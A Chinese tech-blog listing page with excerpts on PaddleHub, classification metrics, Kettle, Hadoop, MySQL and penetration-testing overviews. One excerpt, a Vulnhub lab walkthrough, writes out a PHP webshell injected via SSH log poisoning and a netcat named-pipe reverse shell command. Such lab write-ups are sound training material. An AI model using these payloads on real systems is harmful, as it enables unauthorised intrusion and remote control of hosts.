NOTE： 如果您在本地运行该项目示例，需要首先安装PaddleHub。如果您在线运行，需要首先fork该项目示例。之后按照该示例操作即可。
一、安装环境（这里面有几个坑） !pip install paddlehub==1.6.0 -i https://pypi.tuna.tsinghua.edu.cn/simple !hub install deeplabv3p_xception65_humanseg==1.0.0 虽然说这样就可以了，但是你会发现，你打开本地运行环境以后会出错？？？
以下为出错的内容
JSONDecodeError("Expecting value", s, err.value) from None json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0) 既然如此我们就进源码看一下到底怎么回事
最主要就是这个东西出了问题，在Github上的issue里面说了，在最新版里面已经解决，但其实在windows里面，仍然存在该类问题
然后分析代码后我得知，原来在C盘当中，缺失了config.json文件，然后把这个放到这个根目录的文件里面去.paddle/conf/config.json，如果没有就自己建立一个
{ "server_url": [ "http://paddlepaddle.org.cn/paddlehub" ], "resource_storage_server_url": "https://bj.bcebos.com/paddlehub-data/", "debug": false, "log_level": "DEBUG" } 然后还有一个坑就是，虚拟环境里面运行可能会出错，所以最好在Pycharm真实环境运行
二、接下来就``开始P图 1. 引入包 # 测试图片路径和输出路径 test_path = 'image/test/' output_path = 'image/out/' # 待预测图片 test_img_path = ["
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/55d3a27359733e8956dd8d8bdb780a38/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7b2fb3843e6e979e457a8b4161128bf/" rel="bookmark">
			Python机器学习——模型评估与选择
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python机器学习——模型评估与选择 第6关：准确度的陷阱与混淆矩阵任务描述相关知识准确度的缺陷混淆矩阵 编程要求 第7关：精准率与召回率任务描述相关知识精准率召回率精准率与召回率之间的关系应该选精准率还是召回率作为性能指标？ 编程要求 第8关：F1 Score任务描述相关知识F1 Score 编程要求 第9关：ROC曲线与AUC任务描述相关知识ROC曲线AUC 编程要求 第10关：sklearn中的分类性能指标任务描述相关知识accu\fracy_scoreprecision_scorerecall_scoref1_scoreroc_auc_score 编程要求测试说明 第6关：准确度的陷阱与混淆矩阵 任务描述 本关任务:填写 python 代码，完成 confusion_matrix 函数实现二分类混淆矩阵的构建。
相关知识 准确度的缺陷 准确度这个概念相信对于大家来说肯定并不陌生，就是正确率。例如模型的预测结果与数据真实结果如下表所示：
编号预测结果真实结果112222333411523 很明显，连小朋友都能算出来该模型的准确度为 3/5。
那么准确对越高就能说明模型的分类性能越好吗？非也！举个例子，现在我开发了一套癌症检测系统，只要输入你的一些基本健康信息，就能预测出你现在是否患有癌症，并且分类的准确度为 0.999。您认为这样的系统的预测性能好不好呢？
您可能会觉得，哇，这么高的准确度！这个系统肯定很牛逼！但是我们知道，一般年轻人患癌症的概率非常低，假设患癌症的概率为 0.001，那么其实我这个癌症检测系统只要一直输出您没有患癌症，准确度也可能能够达到 0.999。
假如现在有一个人本身已经患有癌症，但是他自己不知道自己患有癌症。这个时候用我的癌症检测系统检测发现他没有得癌症，那很显然我这个系统已经把他给坑了（耽误了治疗）。看到这里您应该已经体会到了，一个分类模型如果光看准确度是不够的，尤其是对这种样本极度不平衡的情况（ 10000 条健康信息数据中，只有 1 条的类别是患有癌症，其他的类别都是健康）。
混淆矩阵 想进一步的考量分类模型的性能如何，可以使用其他的一些性能指标，例如精准率和召回率。但这些指标计算的基础是混淆矩阵。
继续以癌症检测系统为例，癌症检测系统的输出不是有癌症就是健康，这里为了方便，就用 1 表示患有癌症，0 表示健康。假设现在拿 10000 条数据来进行测试，其中有 9978 条数据的真实类别是 0，系统预测的类别也是 0，有 2 条数据的真实类别是 1 却预测成了 0，有 12 条数据的真实类别是 0 但预测成了 1，有 8 条数据的真实类别是 1，预测结果也是 1。
如果我们把这些结果组成如下矩阵，则该矩阵就成为混淆矩阵。
真实预测010997812128 混淆矩阵中每个格子所代表的的意义也很明显，意义如下：
真实预测010预测0正确的数量预测1错误的数量1预测0错误的数量预测1正确的数量 如果将正确看成是 True，错误看成是 False， 0 看成是 Negtive， 1 看成是 Positive。然后将上表中的文字替换掉，混淆矩阵如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e7b2fb3843e6e979e457a8b4161128bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7d4f524899568f7219e2d66790392377/" rel="bookmark">
			kettle输出步骤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、概述 数据库表：
• 表输出
• 更新，删除，插入/更新
• 批量加载（mysql，oracle）
• 数据同步
文件：
• SQL 文件输出
• 文本文件输出
• XML 输出
• Excel Output/Excel Writer
其他（报表、应用）
二、数据库输出 1.表输出
使用SQL的方式向数据库插入数据（INSERT）
支持批量提交
支持分区（Date分区）
支持字段映射
支持返回自增列
这里提示一下出现表输出的中文乱码问题的解决方案：
设置连接编码：characterEncoding utf8
设置连接编码一般就可以正常输出不乱吗的字符了。如果还有问题，可以继续设置客户端编码
设置客户端：set names utf8;
一个测试的表输出如下：
如果选择分区，需要选择Date字段进行分区，并且需要手动创建表（例如按月分区，有201804 201805两个月，则需要创建tb_201804 tb_201805两个表）
2.返回自增主键
表输出的配置如下：
预览即可查看返回的主键：
3.数据库字段映射
前面步骤可以后后面表输出进行字段映射匹配：
表输出配置如下：
字段映射：
使用猜一猜可以进行名称匹配，如果需要手动匹配，可以左右分别选择，点击Add即可！
并且映射完成之后也可以删除丢弃某些字段
4.其它操作——删除、更新、插入更新
删除：
根据关键字匹配，删除数据库中已有的数据。
更新：
根据关键字匹配，更新数据库中已有的数据。
插入更新：
有则更新，无则插入。
操作都是类似，上面进行匹配，下面进行处理：
5.数据同步
基于比较的同步方式。根据一个flag字段执行相应的插入/更新/删除操作。
配置图如下：使用合并后的flag字段（可能有new deleteed等flag），后续再根据此flag，同步变化的数据到表
6.批量加载
MySQL批量加载需要在Linux环境运行（有命令只能在Linux下运行）
Oracle需要本地有oracle客户端（sqlldr文件，在Oracle安装目录下查找）
三、文件输出 1.SQL文件输出
根据选中的数据库类型，生成相应的 SQL 脚本（DDL，DML）。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7d4f524899568f7219e2d66790392377/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/774174267a8626c9e0de3c70dc7f57fa/" rel="bookmark">
			kettle资源库、运行方式与日志
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、kettle资源库 资源库是用来保存转换任务的，用户通过图形界面创建的的转换任务可以保存在资源库中。
资源库可以使多用户共享转换任务，转换任务在资源库中是以文件夹形式分组管理的，用户可以自定义文件夹名称。
1.ketle资源库元数据
• 资源库
资源库包括文件资源库、数据库资源库
Kettle 4.0 以后资源库类型可以插件扩展
• XML 文件
.ktr 转换文件的XML的根节点必须是 &lt;transformation&gt;
.　kjb 作业XML的根节点是&lt;job&gt;
2.kettle资源库类型
数据库资源库：
• 把 Kettle 的元数据串行化到数据库中，如 R_TRANSFORMATION 表保
存了Kettle 转换的名称、描述等属性。
• 在Spoon 里创建和升级数据库资源库
文件资源库：
在文件的基础上的封装，实现了 org.pentaho.di.repository.Repository 接口。
是Kettle 4.0 以后版本里增加的资源库类型
不使用资源库：
直接保存为ktr 或 kjb 文件。
3.资源库操作
新建资源库：
kettle7.0后新建方式略有不同，新建资源库在右上角-&gt;connect，
详细新建图文步骤，参考：https://blog.csdn.net/m0_37979608/article/details/77096201
使用默认的admin/admin即可登陆到资源库！
如果使用中文进行了资源库命名，将会出现资源库无法新建的问题。解决方案，参考：https://blog.csdn.net/liuwenbiao1203/article/details/77579436
导入/导出资源库：
导航栏-&gt;工具-&gt;导入/导出资源库，或者探索资源库进行指定目录的导出，导出为.xml文件即可！
资源库管理：
kettle新版管理也在右上角：
选择资源库的几点参考对比：
4.统一参数管理
像资源库的一些连接信息应该是不能硬编码写死的，所以kettle也提供了kettle.properties文件来进行全局变量的控制
kettle.properties，文件位于 java 的 user.home 目录下。（通过java SystemProp运行class文件可以查看到）
SystemProp.class
cafe babe 0000 0031 0023 0a00 0800 130a 0015 0900 1400 160a 0017 0018 0700 0d0a 0005 0013 0a00 0500 1907 001a 0100 063c 696e 6974 3e01 0003 2829 5601 0004 436f 6465 0100 0f4c 696e 654e 756d 6265 6162 6c65 0100 0a53 7973 7465 6d50 726f 7001 0005 7072 696e 7401 0004 6d61 696e 0100 1628 5b4c 6a61 7661 2f6c 616e 672f 5374 7269 6e67 3b29 5601 000a 536f 6365 4669 6c65 0100 0f53 7973 7465 6d50 726f 702e 6a61 7661 0c00 0900 0a07 001b 0c00 1c00 1d0c 001e 001f 0700 200c 0022 0c00 0e00 0a01 0010 6a61 7661 2f6c 616e 672f 4f62 6a65 6374 0100 106a 612f 6c61 6e67 2f53 7973 7465 6d01 000d 6765 7450 726f 7065 7274 6965 7301 2829 4c6a 6176 612f 7574 696c 2f50 726f 7065 7274 6965 733b 0100 036f 7574 154c 6a61 7661 2f69 6f2f 5072 696e 7472 6561 6d3b 0100 146a 6176 612f 696c 2f50 726f 7065 7274 6965 7301 6c69 7374 0100 1828 4c6a 6176 612f 696f 2f50 7269 6e74 5374 7265 616d 3b29 2100 0500 0800 0000 0000 0400 0100 0a00 0100 0b00 0000 1d00 0100 0100 052a b700 01b1 0000 0001 000c 0000 0001 0000 0005 0001 000d 000a 0001 000b 0000 0019 0000 0001 0000 0001 b100 0100 0c00 0000 0600 0100 0000 0a00 0e00 0a00 0100 0b00 0000 2c00 0200 0000 0cb8 0002 4c2b b200 03b6 0004 b100 0000 0100 0c00 0000 0e00 0300 0000 0f00 0400 1000 0b00 1200 0900 0f00 1000 0b00 0000 2d00 0200 0200 0000 0dbb 59b7 0006 4c2b b600 07b1 0000 0001 000c 0000 000e 0003 0000 0016 0008 0017 000c 0018 0001 0011 0000 0002 0012 SystemProp.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/774174267a8626c9e0de3c70dc7f57fa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7d1afcbd6739cd47264ac7cc8d3d63d/" rel="bookmark">
			【参考设计】CH340最新官方原理图2020-4-1
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		USB转串口，最新精简原理图如下：
CH340G：
CH340E：
CH340N：
CH340K：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6d3a5a9ed19360242e2ea54dbb75bff2/" rel="bookmark">
			为什么什么语言编程第一个编程都要从Hello world开始？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 每个人学编程的时候，第一次写的程序几乎都是输出hello，world，这个传统是怎么来的呢，又或者是谁规定的呢？今天我们就一起来“考古”一下。输出“Hello, World”是一个功能非常简单的程序，它仅命令计算机向外界打印“Hello，World”这句话。一般来说，它是开发人员用来测试系统的第一个程序。而对于程序员来说，在屏幕上看到这两个词意味着他们的代码可以编译、加载、运行。 在过去的几十年里，它逐渐成为一个历史悠久的传统。屏幕上输出“Hello，World”意味着初学者与计算机交流成功，常常会感到非常兴奋。下面说说编程史上最著名的这两个词是如何开始逐渐形成“传统”的。 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191016111638369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1ZpY2tIVUM=,size_16,color_FFFFFF,t_70) hello world的起源要追溯到1972年，贝尔实验室著名研究员Brian Kernighan在撰写“B语言教程与指导(Tutorial Introduction to the Language B)”时初次使用（程序），这是目前已知最早的在计算机著作中将hello和world一起使用的记录。之后，在1978年，他在他和Dennis Ritchie合作撰写的C语言圣经“The C Programming Language”中，延用了“hello,world”句式，作为开篇第一个程序。在这个程序里，输出的”hello,world” 全部是小写，没有感叹号，逗号后有一空格 。虽然之后几乎没能流传下来这个最初的格式，但从此用hello world向世界打招呼成为惯例。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/04b280780587b0b73fd2e4a8b97f66e8/" rel="bookmark">
			PostgreSQL 判断物理删除表是否成功
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PostgreSQL 判断物理删除表是否成功 service /** * 物理删除表 * * @param tableName 表名 * @return 删除结果 1 删除成功 0 删除失败 */ int dropTableByTableName(@Param("tableName") String tableName); serviceImpl /** * 物理删除表 * * @param tableName 表名 * @return 删除结果 1 删除成功 0 删除失败 */ @Override public int dropTableByTableName(String tableName) { tableInfoMapper.dropTableByTableName(tableName); String name = tableInfoMapper.isTableExistInDB(tableName); if (StringUtils.isBlank(name)) { return 1; } return 0; } mapper /** * 物理删除表 * * @param tableName 表名 * @return 删除结果 */ void dropTableByTableName(@Param("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/04b280780587b0b73fd2e4a8b97f66e8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf96077d3bb69bb34505b308b8ff338f/" rel="bookmark">
			kali渗透综合靶机(十六)--evilscience靶机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、靶机下载 下载链接：https://download.vulnhub.com/theether/theEther_1.0.1.zip
二、evilscience靶机搭建 将下载好的靶机环境，用VMware导入即可使用，文件-&gt;打开
成功导入虚拟机之后，打开即可
三、攻击过程 kali IP：192.168.212.6
靶机IP：192.168.212.12
1、主机发现 2、端口扫描 方法一：
方法二：
3、端口服务识别 4、漏洞查找与利用 访问目标网站
目录扫描
没有发现有用信息
查看网页发现http://192.168.10.195/index.php?file=about.php 测试存在本地文件包含
为了直观的看到测试结果，这里使用Burpsuite处理http请求。
通过尝试包含Linux系统的配置文件，发现存在一定的限制。
如：包含/etc/passwd发现没有结果。
之后测试了几个常见的Apache日志的路径：
/var/log/apache/access.log/var/log/apache2/access.log/var/www/logs/access.log/var/log/access.log
均无结果。
猜测可能是更改了配置文件的路径，尝试读Apache2的配置文件，/etc/apache2/apache2.conf，发现也是失败。
尝试通过php伪协议读取php文件源码，也无果。
file=php://filter/convert.base64-encode/resource=index.php
结合之前信息探测的结果，靶机只开通了http与ssh服务。Apache的日志包含失败，尝试包含ssh的登陆日志。
成功读到ssh的登陆日志。
获取shell 获取一句话Webshell
使用一句话作为用户名登陆靶机的ssh。ssh ‘&lt;?php system($_GET['w']);?&gt;’@192.168.212.12
SSH的日志会记录此次登陆行为，这样就可以把一句话写入ssh的日志文件。测试一下是否成功：
测试phpinfo
成功写入并执行
可以看到一句话已经成功写入。
mknod backpipe p &amp;&amp; nc 测试机IP 监听端口 0&lt;backpipe | /bin/bash 1&gt;backpipe
url编码后：
mknod+backpipe+p+%26%26+nc+测试机IP+监听端口+0%3cbackpipe+%7c+%2fbin%2fbash+1%3ebackpipe
mknod+backpipe+p+%26%26+nc+192.168.212.6+6666+0%3cbackpipe+%7c+%2fbin%2fbash+1%3ebackpipe
kali打开监听
提权一 然后用python -c ‘import pty;pty.spawn("/bin/bash")’ 重新打开一个终端
上图看到用python -c 打开的一个终端还是受限的,需要在用 awk ‘BEGIN{system("/bin/bash")}’ 重新打开一个终端
Sudo -l查看是否属于sudo组
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cf96077d3bb69bb34505b308b8ff338f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ada5b0d5fa8d919639e1b201086aa422/" rel="bookmark">
			Android 高德地图无法后台持续定位，缺少后台定位权限#1207；
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		无法后台持续定位： 高德地图持续定位，在后台持续定位一段时间后就会报错；
错误码:12,错误信息:缺少定位权限 请到http://lbs.amap.com/api/android-location-sdk/guide/utilities/errorcode/查看错误码说明,错误详细信息:后台定位服务没有开启，请在设置中打开后台定位服务开关#1207 手机权限上就没有后台定位权限，Android8.0以后才会提示打开后台定位权限，（如果设置了target &gt; 28，需要增加这个权限 ACCESS_BACKGROUND_LOCATION，否则不会弹出"始终允许"这个选择框）；
下面看一下踩坑之旅：
集成高德地图定位SDK： 按照官方文档集成就行了：
1、Android Studio 配置工程 ；
2、获取定位数据 ；
3、Android 8.0权限说明，后台定位权限；
下面就是在后台持续定位的代码，前台服务；也可以参考这个官方Demo android-o-backgroundlocation：
public class BackLocationService extends Service { public BackLocationService() { } @Override public IBinder onBind(Intent intent) { // TODO: Return the communication channel to the service. throw new UnsupportedOperationException("Not yet implemented"); } @Override public void onCreate() { super.onCreate(); } @Override public int onStartCommand(Intent intent, int flags, int startId) { startForeground(1,buildNotification()); initLocation(); // 设置定位参数 locationClient.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ada5b0d5fa8d919639e1b201086aa422/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0af6e652563c9957119d8f43cbf0542a/" rel="bookmark">
			【Hadoop】YouTube 视频数据集分析实验 (原理&#43;过程&#43;代码)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、实验背景 随着近年来视频拍摄设备与视频处理技术的高速发展，对网络上海量视频的分析越来越受到关注与重视。本实验希望通过使用 Hadoop 实验数据集 —— Dataset for "Statistics and Social Network of YouTube Videos" 进行简明的分析实验，从而加深对大数据分析的体会与认识、对 Hadoop、MapReduce 等的理解与应用。 二、实验目的 本实验将在虚拟机上 (CentOS 7.5 64bits)，基于 Hadoop 2.7.5 (64bits)，使用 MapReduce 实现对部分 YouTube 视频数据集的分析，以统计出某一时期内 YouTube 用户已上传视频类型的总数量，并对可视化后的结果进行简要的比较与分析。
三、实验过程 3.1 数据集预处理与上传 本实验所用的 YouTube 数据集下载自 School of Computing Science Simon Fraser University。数据集中，每行都代表一条用户上传视频数据，每行中各字段由 Tab 字符 ('\t') 分隔开，各字段含义按顺序如下表所示：
部分数据集如下所示。其中，每行数据从左往右依次表示：video ID、uploader、age、category、length、views、rate、ratings、comments、related IDs。而本实验所关心的、将使用到的是 category 这项 (蓝框)。
实验所用的数据集采样自2007年2月22至5月18日中的35天的YouTube用户上传视频信息。由于下载得到的数据集共有35个压缩包(解压后是4-5个txt文本)，对应35天的采样数据，为此，我们需要先在本地主机上合并它们。合并方法有很多种，此处将主要描述方法一，概述方法二。
3.1.1 合并数据集——方法一 先把解压后的所有txt数据文本放置在桌面的DataforUpload文件夹中，然后打开命令行程序，按路径 cd 进入DataforUpload文件夹，执行 copy *.* all.txt 对文件夹下所有数据文本执行复制合并的批处理操作，生成汇总数据集文件 all.txt 共计895.5MB，含数据约一百万条以上，如下所示：
然后连接VPN，登陆虚拟机，运行Hadoop进程，再使用upload程序(见附录)将本地的数据集all.txt上传至HDFS的 "/hadoop2/videoinput2/" 路径下。通过 HDFS Web UI 验证文件上传成功，如下所示：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0af6e652563c9957119d8f43cbf0542a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/674a36fd4fc335e718176b2b98914be9/" rel="bookmark">
			MySQL优化篇：执行计划explain中key_len计算方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概述 key_len表示索引使用的字节数，根据这个值可以判断索引的使用情况，特别是在使用联合索引的时候，判断该索引有多少部分被使用到非常重要。
key_len的长度计算公式很重要（key_len越小，说明索引效果越好）
准备结构和数据 在MySQL数据库中，新建表，表名为key_len_demo
CREATE TABLE `key_len_demo` ( `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, `name` CHAR(20) NOT NULL DEFAULT '', `address` CHAR(20) DEFAULT NULL, `remark` VARCHAR(20) NOT NULL DEFAULT '', PRIMARY KEY (`id`), KEY `name` (`name`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8; 向表中插入几条示例数据，便于演示
INSERT INTO `jdbc`.`key_len_demo` (`id`, `name`, `address`, `remark`) VALUES ('1', '张三', '上海道', '测试1'); INSERT INTO `jdbc`.`key_len_demo` (`id`, `name`, `address`, `remark`) VALUES ('2', '李四', '杭州道', '测试2'); INSERT INTO `jdbc`.`key_len_demo` (`id`, `name`, `address`, `remark`) VALUES ('3', '王五', '福建到道', '3000'); INSERT INTO `jdbc`.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/674a36fd4fc335e718176b2b98914be9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e210b8dbf353dd57d8f99fa0ef812238/" rel="bookmark">
			渗透测试工具对比表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		编号工具名称工具介绍适用范围优点缺点1MetasploitMetasploit是一种框架，拥有庞大的编程员爱好者群体，广大编程员添加了自定义模块，测试工具可以测试众多操作系统和应用程序中存在的安全漏洞。人们在GitHub和Bitbucket上发布这些自定义模块。与GitHub一样，Bitbucket也是面向编程项目的在线软件库。Saez说：“Metasploit是最流行的渗透测试工具。”
相关链接：http://www.metasploit.comMetasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。这种可以扩展的模型将负载控制，编码器，无操作生成器和漏洞整合在一起，使 Metasploit Framework 成为一种研究高危漏洞的途径。它集成了各平台上常见的溢出漏洞和流行的 shellcode ，并且不断更新。最新版本的 MSF 包含了750多种流行的操作系统及应用软件的漏洞，以及224个 shellcode 。作为安全工具，它在安全检测中用着不容忽视的作用，并为漏洞自动化探测和及时检测系统漏洞提供了有力保障。Metasploit自带上百种漏洞，还可以在online exploit building demo（在线漏洞生成演示）上看到如何生成漏洞。　2nessusNessus安全漏洞扫描器是一款备受欢迎的、基于特征的工具，可用于查找安全漏洞。Saez说：“Nessus只能将扫描结果与收录有已知安全漏洞特征的数据库进行比对。”
相关链接：http://www.tenable.com/products/nessus-vulnerability-scanner Nessus 可同时在本机或远端上摇控, 进行系统的漏洞分析扫描。* 完整支持SSL (Secure Socket Layer)。
* 可自行定义插件(Plug-in)
* 采用客户/服务器体系结构，客户端提供了运行在X window 下的图形界面，接受用户的命令与服务器通信，传送用户的扫描请求给服务器端，由服务器启动扫描并将扫描结果呈现给用户；
* 其运作效能能随着系统的资源而自行调整Nessus对个人用户是免费的，只需要在官方网站上填邮箱，立马就能收到注册号了，对应商业用户是收费的。3NmapNmap网络扫描器让渗透测试人员能够确定企业在其网络上拥有的计算机、服务器和硬件的类型。这些机器可以通过这些外部探测来查明，这本身就是个安全漏洞。攻击者利用这些信息为攻击奠定基础。
相关链接：https://nmap.org一是探测一组主机是否在线；
其次是扫描 主机端口，嗅探所提供的网络服务；
还可以推断主机所用的操作系统 利用nmap来搜集目标电脑的网络设定，从而计划攻击的方法。辅助工具4Burp SuiteBurp Suite是另一款备受欢迎的Web应用程序渗透测试工具。据Burp Suite Web安全工具厂商PortSwigger声称，它可以标绘并分析Web应用程序，查找并利用安全漏洞。
相关链接：http://portswigger.net/burp/
1.代理–Burp Suite带有一个代理,通过默认端口8080上运行，使用这个代理，我们可以截获并修改从客户端到web应用程序的数据包.
2.Spider(蜘蛛)–Burp Suite的蜘蛛功能是用来抓取Web应用程序的链接和内容等，它会自动提交登陆表单（通过用户自定义输入）的情况下.Burp Suite的蜘蛛可以爬行扫描出网站上所有的链接,通过对这些链接的详细扫描来发现Web应用程序的漏洞 。
3.Scanner(扫描器)–它是用来扫描Web应用程序漏洞的.在测试的过程中可能会出现一些误报。重要的是要记住,自动扫描器扫描的结果不可能完全100%准确.
4.Intruder(入侵)–此功能呢可用语多种用途,如利用漏洞,Web应用程序模糊测试,进行暴力猜解等.
5.Repeater(中继器)–此功能用于根据不同的情况修改和发送相同的请求次数并分析.
6.Sequencer–此功能主要用来检查Web应用程序提供的会话令牌的随机性.并执行各种测试.
7.Decoder(解码)–此功能可用于解码数据找回原来的数据形式,或者进行编码和加密数据.
8.Comparer–此功能用来执行任意的两个请求,响应或任何其它形式的数据之间的比较.Burp Suite 是用于攻击web 应用程序的集成平台
请求的拦截和修改,扫描web应用程序漏洞,以暴力破解登陆表单,执行会话令牌等多种的随机性检查包含了许多工具，并为这些工具设计了许多接口
所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。入门很难，参数复杂，但是一旦掌握它的使用方法，在日常工作中肯定会如如虎添翼；5OWASP ZAPOWASP ZAP(Zed攻击代理)是来自非营利性组织OWASP(开放Web应用程序安全项目)的Web应用程序渗透测试工具。ZAP提供了自动和手动的Web应用程序扫描功能，以便服务于毫无经验和经验丰富的专业渗透测试人员。 ZAP是一款如今放在GitHub上的开源工具。
相关链接：https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project用于web应用程序漏洞挖掘的渗透测试工具提供自动扫描工具还提供了一些用于手动挖掘安全漏洞的工具
http://wenku.baidu.com/link?url=o_yEAZR77FdrVSLT9dkl1Ceufm76SAvoGGKJ3BaROVuZN5nksdn-4mZL8Alq92PaPbdyg4R8pM9USOjoLLeKczaqGtBVomb3VB8kQPgR56uhttp://bobao.360.cn/learning/detail/498.html6SQLmapSQLmap可自动查找SQL注入攻击漏洞。然后，它会利用那些安全漏洞，全面控制数据库和底层服务器。
相关链接：http://sqlmap.org开源sql自动化注入工具，可以用来检测和利用sql注入漏洞。专业检测和利用sql注入漏洞
http://blog.csdn.net/zgyulongfei/article/details/41017493/sqlmap只是用来检测和利用sql注入点的，并不能扫描出网站有哪些漏洞，使用前请先使用扫描工具扫出sql注入点
它由Python语言开发而成，因此运行需要安装python环境。7Kali LinuxKali Linux是一款一体化工具，包含一套专用的预安装测试(以及安全和取证分析)工具。Saez说：“它拥有的工具面向对安全一无所知的人。”
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e210b8dbf353dd57d8f99fa0ef812238/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b670c1bc8280309ddc8ed567eedcdec0/" rel="bookmark">
			渗透测试分类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实际上渗透测试并没有严格的分类方式，即使在软件开发生命周期中，也包含了渗透测试的环节，但根据实际应用，普遍认同的几种分类方法如下：
一、方法分类 1、黑盒测试①黑盒测试（Black-box Testing）也称为外部测试（External Testing）。采用这种方式时，渗透测试团队将从一个远程网络位置来评估目标网络基础设施，并没有任何目标网络内部拓扑等相关信息，他们完全模拟真实网络环境中的外部攻击者，采用流行的攻击技术与工具，有组织有步骤地对目标组织进行逐步的渗透与入侵，揭示目标网络中一些已知或未知的安全漏洞，并评估这些漏洞能否被利用获取控制权或造成业务资产的损失。
②黑盒测试还可以对目标组织内部安全团队的检测与响应能力做出评估。在测试结束之后，黑盒测试会对发现的目标系统安全漏洞、所识别的安全风险及其业务影响评估等信息进行总结和报告。
③黑盒测试是比较费时费力的，同时需要渗透测试者具备较高的技术能力。在安全业界的渗透测试者眼中，黑盒测试通常是更受推崇的，因为它能更逼真地模拟一次真正的攻击过程。 2、白盒测试①白盒测试（White-box Testing）也称为内部测试（Internal Testing）。进行白盒测试的团队将可以了解到关于目标环境的所有内部与底层知识，因此这可以让渗透测试者以最小的代价发现和验证系统中最严重的安全漏洞。如果实施到位，白盒测试能够比黑盒测试消除更多的目标基础设施环境中的安全漏洞与弱点，从而给客户组织带来更大的价值。
②白盒测试的实施流程与黑盒测试类似，不同之处在于无须进行目标定位与情报搜集；此外，白盒测试能够更加方便地在一次常规的开发与部署计划周期中集成，使得能够在早期就消除掉一些可能存在的安全问题，从而避免被入侵者发现和利用。
③白盒测试中发现和解决安全漏洞所需花费的时间和代价要比黑盒测试少许多。而白盒测试的最大问题在于无法有效地测试客户组织的应急响应程序，也无法判断出他们的安全防护计划对检测特定攻击的效率。如果时间有限或是特定的渗透测试环节（如情报搜集）并不在范围之内，那么白盒测试可能是最好的选项。 3、灰盒测试以上两种渗透测试基本类型的组合可以提供对目标系统更加深入和全面的安全审查，这就是灰盒测试（Grey-box Testing），组合之后的好处就是能够同时发挥两种基本类型渗透测试方法的各自优势。灰盒测试需要渗透测试者能够根据对目标系统所掌握的有限知识与信息，来选择评估整体安全性的最佳途径。在采用灰盒测试方法的外部渗透场景中，渗透测试者也类似地需要从外部逐步渗透进入目标网络，但他所拥有的目标网络底层拓扑与架构将有助于更好地决策攻击途径与方法，从而达到更好的渗透测试效果。 二、目标分类 1、主机操作系统渗透 对Windows、Solaris、AIX、Linux、SCO、SGI等操作系统本身进行渗透测试。
2、数据库系统渗透
对MS-SQL、Oracle、MySQL、Informix、Sybase、DB2、Access等数据库应用系统进行渗透测试。
3、应用系统渗透
对渗透目标提供的各种应用，如ASP、CGI、JSP、PHP等组成的WWW应用进行渗透测试。
4、网络设备渗透
对各种防火墙、入侵检测系统、网络设备进行渗透测试。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/183658ce274123e5a736fb44db101e6a/" rel="bookmark">
			敏感数据的安全防范
			</a>
		</h2>
		
	</header>
